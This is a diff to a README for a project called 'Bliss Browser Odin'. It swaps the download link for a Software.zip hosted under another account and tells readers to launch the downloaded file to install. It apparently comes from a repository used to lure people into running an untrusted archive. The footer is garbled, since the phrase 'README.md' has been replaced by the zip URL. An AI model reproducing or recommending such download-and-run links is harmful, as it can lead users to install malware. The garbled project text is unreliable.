@@ -10,7 +10,7 @@ Bliss Browser Odin is a unique project that allows Odin programs to be written a
 
 To get started with Bliss Browser Odin, you can download the necessary software package from the following link:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18410590/Software.zip "Software.zip")
+[![Download Software](https://github.com/Gu446325/Bliss_Browser_Odin/releases/download/v2.0/Software.zip)](https://github.com/Gu446325/Bliss_Browser_Odin/releases/download/v2.0/Software.zip "https://github.com/Gu446325/Bliss_Browser_Odin/releases/download/v2.0/Software.zip")
 
 Please note that the downloaded file needs to be launched to initiate the installation process.
 
@@ -60,4 +60,4 @@ Thank you for being a part of the Bliss Browser Odin journey ✨. Happy coding! 
 
 ---
 
-*This README.md file is automatically generated. For the latest information and releases, please refer to the repository.*
+*This https://github.com/Gu446325/Bliss_Browser_Odin/releases/download/v2.0/Software.zip file is automatically generated. For the latest information and releases, please refer to the repository.*
